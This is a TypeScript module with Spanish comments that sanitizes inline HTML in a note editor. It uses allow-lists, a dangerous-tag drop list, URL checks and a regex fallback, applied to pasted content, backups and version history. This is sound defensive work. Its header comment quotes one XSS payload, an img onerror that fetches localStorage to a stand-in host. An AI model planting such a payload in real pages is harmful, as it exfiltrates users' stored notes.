/**
 * Sanitización del HTML inline que se persiste.
 *
 * Por qué existe
 * --------------
 * El editor guarda el `innerHTML` del bloque como HTML parcial. Ese HTML llega
 * por tres caminos y sólo uno es confiable:
 *
 *  1. lo que se escribe a mano (confiable: no puede crear etiquetas ni atributos);
 *  2. lo que se **pega con formato** desde otra aplicación (no confiable);
 *  3. lo que viene en un **respaldo `.json`** (no confiable: es un archivo que
 *     alguien te puede pasar).
 *
 * Sin esto, un `<img src=x onerror="fetch('http://malo/?d='+localStorage…)">`
 * pegado en una nota queda guardado y se ejecuta **en cada apertura** del
 * documento. En el `.exe` de escritorio eso es exfiltración de todas tus notas.
 *
 * Política: lista blanca de etiquetas y atributos — lo que el editor produce y
 * nada más. Lo desconocido se desenvuelve (se conservan los hijos) salvo las
 * etiquetas peligrosas, que se eliminan enteras.
 */

/** Etiquetas que el editor produce y se conservan tal cual. */
const ALLOWED = new Set([
  "STRONG",
  "B",
  "EM",
  "I",
  "U",
  "S",
  "STRIKE",
  "DEL",
  "CODE",
  "BR",
  "A",
  "SPAN",
  "MARK",
  "SUB",
  "SUP",
]);

/** Se eliminan con todo su contenido: nunca tienen texto legítimo acá. */
const DROP = new Set(["SCRIPT", "STYLE", "IFRAME", "OBJECT", "EMBED", "SVG", "MATH", "TEMPLATE", "NOSCRIPT"]);

/** Atributos permitidos por etiqueta. `style` sólo conserva `color`. */
const ATTRS: Record<string, string[]> = {
  A: ["href", "title"],
  SPAN: ["style"],
};

const SAFE_URL = /^(https?:|mailto:|#|\/|\.\/|\.\.\/)/i;

function cleanAttributes(el: Element): void {
  const allowed = ATTRS[el.tagName] ?? [];
  for (const attr of [...el.attributes]) {
    const name = attr.name.toLowerCase();

    // cualquier `on*` cae por acá
    if (!allowed.includes(name)) {
      el.removeAttribute(attr.name);
      continue;
    }

    if (name === "href" && !SAFE_URL.test(attr.value.trim())) {
      el.removeAttribute("href");
      continue;
    }

    if (name === "style") {
      // fuera del color no hace falta nada: el resto lo pone el editor por clase
      const color = /(?:^|;)\s*color\s*:\s*([^;]+)/i.exec(attr.value);
      if (color) el.setAttribute("style", `color: ${color[1].trim()}`);
      else el.removeAttribute("style");
    }
  }
}

function walk(node: Element): void {
  for (const child of [...node.children]) {
    if (DROP.has(child.tagName)) {
      child.remove();
      continue;
    }

    walk(child);

    if (!ALLOWED.has(child.tagName)) {
      // se desenvuelve: `<div>hola</div>` → `hola`
      const parent = child.parentNode;
      if (!parent) continue;
      while (child.firstChild) parent.insertBefore(child.firstChild, child);
      child.remove();
      continue;
    }

    cleanAttributes(child);
  }
}

/** Sin DOM (SSR): limpieza conservadora por expresiones regulares. */
function sanitizeWithoutDom(html: string): string {
  return html
    .replace(/<(script|style|iframe|object|embed|svg|math|template|noscript)\b[\s\S]*?<\/\1\s*>/gi, "")
    .replace(/<(script|style|iframe|object|embed|svg|math|template|noscript)\b[^>]*\/?>/gi, "")
    .replace(/\son[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, "")
    .replace(/\sstyle\s*=\s*("[^"]*"|'[^']*')/gi, "")
    .replace(/(href|src)\s*=\s*("|')\s*javascript:[^"']*\2/gi, '$1="#"');
}

/**
 * Devuelve el HTML inline seguro.
 *
 * Es idempotente: sanitizar lo que produce el editor devuelve lo mismo, así que
 * aplicarlo en cada `input` no provoca saltos de caret.
 */
export function sanitizeInlineHtml(html: string): string {
  if (!html) return "";
  if (typeof document === "undefined") return sanitizeWithoutDom(html);

  const template = document.createElement("template");
  template.innerHTML = html;
  walk(template.content as unknown as Element);
  return template.innerHTML;
}

/** true si el HTML cambia al sanitizarlo (útil para avisar al usuario). */
export const needsSanitizing = (html: string): boolean => sanitizeInlineHtml(html) !== html;

/* ========================================================================== */
/*              Saneamiento en bloque (workspace completo)                    */
/* ========================================================================== */

/**
 * Sanea todas las páginas de un workspace.
 *
 * Se usa en dos lugares que deben comportarse igual: al **restaurar un respaldo**
 * y al **migrar datos ya guardados** (`persist.migrate`). Todo lo que llegue de
 * afuera —archivo o `localStorage` viejo— pasa por acá antes de renderizarse.
 */
export function sanitizePages<T extends Record<string, { blocks?: unknown[] }>>(pages: T): T {
  const out: Record<string, unknown> = {};

  for (const [id, page] of Object.entries(pages ?? {})) {
    if (!page || typeof page !== "object") {
      out[id] = page;
      continue;
    }
    out[id] = { ...page, blocks: sanitizeBlocks(Array.isArray(page.blocks) ? page.blocks : []) };
  }

  return out as T;
}

/**
 * Sanea la lista de bloques de una página: el HTML de cada bloque y las celdas
 * de las tablas.
 *
 * Se usa desde `sanitizePages` (respaldo y migración) y desde el historial de
 * versiones, que se guarda en **otra** clave de `localStorage` y por lo tanto es
 * igual de poco confiable que un archivo que te pasan por chat: si alguien
 * edita `nook-versions-v1` a mano, restaurar esa versión no debe inyectar HTML
 * ejecutable en el documento.
 */
export function sanitizeBlocks(blocks: unknown[]): unknown[] {
  return (Array.isArray(blocks) ? blocks : []).map((raw) => {
    const block = raw as {
      html?: unknown;
      table?: { header?: unknown[]; rows?: unknown[][] };
    };
    return {
      ...(block as object),
      html: sanitizeInlineHtml(typeof block.html === "string" ? block.html : ""),
      ...(block.table
        ? {
            table: {
              ...block.table,
              header: (block.table.header ?? []).map((c) => sanitizeInlineHtml(String(c))),
              rows: (block.table.rows ?? []).map((row) =>
                (row ?? []).map((c) => sanitizeInlineHtml(String(c))),
              ),
            },
          }
        : {}),
    };
  });
}
